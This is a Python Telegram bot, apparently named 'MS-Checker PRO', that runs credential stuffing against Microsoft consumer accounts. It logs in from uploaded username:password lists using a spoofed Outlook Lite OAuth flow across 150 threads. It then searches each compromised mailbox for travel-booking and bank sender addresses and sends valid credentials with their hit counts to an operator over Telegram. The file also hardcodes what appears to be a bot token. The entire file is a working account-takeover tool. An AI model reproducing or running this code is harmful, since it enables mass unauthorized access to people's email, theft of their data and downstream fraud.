import requests
import uuid
import re
import threading
import json
import os
import telebot
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION ---
CREDENTIALS_FILE = "list.txt"
KEYWORDS_FILE = "keywords.txt"
HITS_FILE = "hits.txt"
HITSS_FILE = "hits_jysr.txt"
TOKEN_ERROR_FILE = "Token Error.txt"
BAD_FILE = "BAD.txt"
ERROR_FILE = "Error.txt"
DEBUG_LOG_FILE = "debug_traffic.jsonl"
THREADS = 150

# --- DEFAULT KEYWORDS ---
DEFAULT_KEYWORDS = [
    "no-reply@agoda.com",
    "no-reply@account.agoda.com",
    "no-reply@security.agoda.com",
    "noreply@almosafer.com",
    "DIB.notification@dib.ae",
    "orders@asos.com",
    "noreply@airalo.com",
    "noreply@priceline.com",
    "donotreply@expediagroup.com"
]

# --- TELEGRAM BOT CONFIG ---
TOKEN = "7951542153:AAGkZNOOmNo7GM2tlXTihy-N4Ddw808pSDs"
ADMIN_ID = 7825511166
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# --- GLOBAL COUNTERS ---
stats = {
    "invalid": 0,
    "good": 0,
    "keywords_good": 0,
    "total": 0,
    "checked": 0
}
file_lock = threading.Lock()

# --- DESIGNED MESSAGES ---

def send_telegram_hit(message_text):
    """Formats and sends a hit with keywords to the admin."""
    parts = message_text.split('|')
    acc_info = parts[0].replace('✅ HIT: ', '').strip()
    results = parts[1].strip() if len(parts) > 1 else "N/A"
    
    formatted_msg = (
        f"<b>💎 PREMIUM HIT FOUND</b>\n"
        f"<code>──────────────────────</code>\n"
        f"👤 <b>Account:</b>\n<code>{acc_info}</code>\n\n"
        f"🔍 <b>Results:</b>\n<code>{results}</code>\n"
        f"<code>──────────────────────</code>\n"
        f"<b>🕒 Time:</b> {datetime.now().strftime('%H:%M:%S')}"
    )
    try:
        bot.send_message(ADMIN_ID, formatted_msg)
    except Exception as e:
        print(f"[!] Telegram Send Error: {e}")

@bot.message_handler(commands=['status'])
def get_status(message):
    remaining = stats["total"] - stats["checked"]
    status_text = (
        f"<b>📊 CURRENT CHECK STATUS</b>\n"
        f"<code>──────────────────────</code>\n"
        f"🚫 <b>Invalid:</b> <code>{stats['invalid']}</code>\n"
        f"✅ <b>Good:</b> <code>{stats['good']}</code>\n"
        f"🔥 <b>Keywords Good:</b> <code>{stats['keywords_good']}</code>\n"
        f"⏳ <b>Not Checking:</b> <code>{max(0, remaining)}</code>\n"
        f"<code>──────────────────────</code>\n"
        f"<b>📈 Progress:</b> <code>{stats['checked']}/{stats['total']}</code>"
    )
    bot.reply_to(message, status_text)

# --- REQUEST LOGIC ---

def log_traffic(user, step_name, response):
    try:
        req_body = response.request.body
        if isinstance(req_body, bytes):
            req_body = req_body.decode('utf-8', 'ignore')
        
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "user": user,
            "step": step_name,
            "request": {"url": response.request.url, "method": response.request.method, "headers": dict(response.request.headers), "body": req_body},
            "response": {"status_code": response.status_code, "headers": dict(response.headers), "cookies": response.cookies.get_dict(), "body_preview": response.text[:1000]}
        }
        with file_lock:
            with open(DEBUG_LOG_FILE, "a", encoding="utf-8") as f:
                f.write(json.dumps(log_entry) + "\n")
    except: pass

def check_account(credential, keywords):
    global stats
    try:
        parts = credential.strip().split(':')
        if len(parts) < 2: 
            with file_lock: 
                stats["invalid"] += 1
                stats["checked"] += 1
            return f"⚠️ Invalid Format"
        user, password = parts[0], parts[1]
    except: 
        with file_lock: 
            stats["invalid"] += 1
            stats["checked"] += 1
        return f"⚠️ Invalid Format"

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36",
        "X-Requested-With": "com.microsoft.outlooklite"
    })

    try:
        auth_url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={user}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        auth_res = session.get(auth_url, timeout=15)
        log_traffic(user, "Authorize_GET", auth_res)

        url_post = re.search(r'urlPost":"(.*?)"', auth_res.text).group(1) if 'urlPost' in auth_res.text else None
        ppft = re.search(r'name=\\\"PPFT\\\" id=\\\"i0327\\\" value=\\\"(.*?)\"', auth_res.text).group(1) if 'PPFT' in auth_res.text else None
        ad = auth_res.url.split("haschrome=1")[0] if "haschrome=1" in auth_res.url else ""

        if not url_post or not ppft:
            with file_lock: 
                stats["invalid"] += 1
                stats["checked"] += 1
            return f"❌ Token Parse Error"

        login_payload = {"i13": "1", "login": user, "loginfmt": user, "type": "11", "LoginOptions": "1", "passwd": password, "PPFT": ppft, "PPSX": "PassportR", "NewUser": "1", "fspost": "0", "i21": "0", "i19": "9960"}
        login_res = session.post(url_post, data=login_payload, headers={"Referer": f"{ad}haschrome=1"}, allow_redirects=False, timeout=15)
        
        location_header = login_res.headers.get("Location", "")
        code_match = re.search(r'code=(.*?)&', location_header)
        
        if not code_match:
            with file_lock: 
                stats["invalid"] += 1
                stats["checked"] += 1
            return f"❌ Login Failed"
        
        token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        token_payload = {"client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "grant_type": "authorization_code", "code": code_match.group(1), "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
        
        token_res = session.post(token_url, data=token_payload, timeout=15)
        token_data = token_res.json()

        if "access_token" in token_data:
            atk = token_data["access_token"]
            cid = session.cookies.get("MSPCID", "NONE").upper()
            results_summary = []
            
            for kw in keywords:
                search_url = "https://substrate.office.com/searchservice/api/v2/query?n=88"
                search_headers = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {atk}", "X-AnchorMailbox": f"CID:{cid}", "Content-Type": "application/json"}
                search_payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "EntityRequests": [{"EntityType": "Message", "ContentSources": ["Exchange"], "Query": {"QueryString": kw}, "Size": 1}]}
                
                try:
                    s_res = session.post(search_url, json=search_payload, headers=search_headers, timeout=15)
                    s_json = s_res.json()
                    e_sets = s_json.get("EntitySets", [])
                    if e_sets:
                        r_sets = e_sets[0].get("ResultSets", [])
                        if r_sets:
                            total = r_sets[0].get("Total", 0)
                            if total > 0: results_summary.append(f"{kw}:[{total}]")
                except: pass

            with file_lock: stats["checked"] += 1
            if results_summary:
                final_line = f"✅ HIT: {user}:{password} | " + " | ".join(results_summary)
                with file_lock: stats["keywords_good"] += 1
                send_telegram_hit(final_line) 
                with file_lock:
                    with open(HITS_FILE, "a") as f: f.write(final_line + "\n")
                return final_line
            else:
                with file_lock: stats["good"] += 1
                with open(HITSS_FILE, "a") as f: f.write(f"✅ HIT (No Keywords): {user}:{password}\n")
                return f"✅ Good (No KW): {user}"
        
        with file_lock: 
            stats["invalid"] += 1
            stats["checked"] += 1
        return f"❌ Token Error"
    except Exception as e:
        with file_lock: 
            stats["invalid"] += 1
            stats["checked"] += 1
        return f"⚠️ Error: {str(e)}"

# --- BOT HANDLERS ---

@bot.message_handler(commands=['start'])
def start(message):
    # Initialize Keywords file with your requested list
    with open(KEYWORDS_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(DEFAULT_KEYWORDS))
    
    welcome_text = (
        "<b>👋 Welcome to MS-Checker PRO</b>\n\n"
        "✅ <b>Default Keywords Loaded:</b>\n"
        f"<code>{len(DEFAULT_KEYWORDS)} domains from Agoda/Almosafer/etc.</code>\n\n"
        "💬 If you want to use DIFFERENT keywords, send them now.\n"
        "📁 Otherwise, just upload <b>any .txt file</b> to start."
    )
    bot.reply_to(message, welcome_text)
    bot.register_next_step_handler(message, process_keywords)

def process_keywords(message):
    if not message.text: return
    # If user sends /status or uploads a file instead of text, handle it
    if message.text.startswith('/'): return

    keywords = [line.strip() for line in message.text.split('\n') if line.strip()]
    with open(KEYWORDS_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(keywords))
    bot.reply_to(message, f"✅ <b>{len(keywords)} Custom Keywords Loaded!</b>\n\n📁 Upload your <b>.txt</b> file to begin:")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    if message.document.file_name.lower().endswith(".txt"):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open(CREDENTIALS_FILE, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        bot.reply_to(message, f"🚀 <b>File '{message.document.file_name}' received.</b>\nChecking started .... \nUse /status for live stats.")
        run_checker(message)
    else:
        bot.reply_to(message, "⚠️ Error: Please upload a <b>.txt</b> file.")

def run_checker(message):
    global stats
    try:
        with open(KEYWORDS_FILE, 'r') as f: 
            keywords = [line.strip() for line in f if line.strip()]
        with open(CREDENTIALS_FILE, 'r') as f: 
            accounts = [line.strip() for line in f if line.strip()]
    except:
        keywords = DEFAULT_KEYWORDS
        with open(CREDENTIALS_FILE, 'r') as f: 
            accounts = [line.strip() for line in f if line.strip()]
    
    # Reset stats
    with file_lock:
        stats = {"invalid": 0, "good": 0, "keywords_good": 0, "total": len(accounts), "checked": 0}

    def task():
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(check_account, acc, keywords) for acc in accounts]
            for future in futures: 
                future.result()
        
        bot.send_message(message.chat.id, "🏁 <b>Checking stopped.</b>\nSession Finished.")

    threading.Thread(target=task).start()

if __name__ == "__main__":
    print("Bot is alive and checking Agoda keywords...")
    bot.infinity_polling()
